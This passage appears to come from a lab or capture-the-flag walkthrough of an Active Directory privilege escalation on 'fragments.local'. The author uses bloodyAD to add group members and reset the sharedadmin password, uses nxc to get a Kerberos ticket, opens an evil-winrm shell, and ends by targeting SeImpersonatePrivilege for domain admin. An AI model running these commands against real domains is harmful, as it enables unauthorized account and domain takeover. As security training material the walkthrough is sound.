And this group has GenericAll on the `shareadmin`

# Adding `d.goggins` to `adminaccs` group and compromising `sharedadmin`

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' add groupMember 'adminaccs' 'd.goggins' 

[+] d.goggins added to adminaccs
```

Now the user is in the account i will have GenericAll over the `shareadmin`

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' set password 'sharedadmin' 'Password123!'
[+] Password changed successfully!
```

This has now changed the password of the user!

> In the real world this isnt something you would do unless given explicit permission!

Now remember this user sharedadmin is in protected users so ill have to authenticate with kerberos!

```python
nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' --smb-timeout 5 -k
SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
```

This user is now compromised!

# Enumeration of `sharedadmin`

Now looking at bloodhound i see this user is apart of the account operators group, this is game over!

![](Pasted%20image%2020260803201437.png)

https://blog.cyberadvisors.com/technical-blog/blog/account-operators-privilege-escalation

So this means i have GenericAll over a lot of high privileged groups, excluding the protected groups, like administrators, domain admins and enterprise admins

There are several methods to abuse this privilege as seen with the 49 instances of outbound object control in bloodhound

# Abusing `iis_iusrs`

So since i have GenericAll over the group itslelf i first have to add my user to the group!

```python
nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' --smb-timeout 5 -k --generate-tgt sharedadmin
SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123! 
SMB         dc01.fragments.local 445    DC01             [+] TGT saved to: sharedadmin.ccache
SMB         dc01.fragments.local 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=sharedadmin.ccache
```

Since im using kerberos becuase of the limitations of the protected users ill start by generating a TGT

```python
export KRB5CCNAME=sharedadmin.ccache
```

Now its exported i can add this user to the required groups

```python
bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'remote management users' 'sharedadmin' 
[+] sharedadmin added to remote management users
```

First ive added them to remote management so i can winrm

```python
bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'iis_iusrs' 'sharedadmin'
[+] sharedadmin added to iis_iusrs
```

Now theyre also in the correct group to inherit SeImpersonatePrivilege

```python
sudo nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' -k --smb-timeout 5 --generate-krb5-file /etc/krb5.conf
SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.fragments.local 445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
SMB         dc01.fragments.local 445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
```

```python
export KRB5_CONFIG=/etc/krb5.conf
```

Then ill generate a realm and export it to so i can login to winrm because of the limitations of kerberos!

## Domain Admin

```python
evil-winrm -i dc01.fragments.local -u sharedadmin -r fragments.local                                
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
```

```python
*Evil-WinRM* PS C:\Users\sharedadmin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
```

As seen here i now have `SeImpersonatePrivilege`

So ill use DeadPotato to exploit this!


